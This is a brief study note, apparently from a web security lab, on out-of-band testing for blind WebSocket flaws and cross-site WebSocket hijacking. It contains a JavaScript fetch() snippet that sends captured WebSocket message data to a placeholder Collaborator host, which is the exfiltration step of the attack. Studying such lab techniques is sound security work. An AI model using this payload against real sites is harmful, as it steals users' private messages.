# OAST

The source notes that blind WebSocket vulnerabilities may require OAST.

The CSWSH lab uses Burp Collaborator to receive exfiltrated messages:

```javascript
fetch('https://your-collaborator-url', {
    method: 'POST',
    mode: 'no-cors',
    body: event.data
});
```
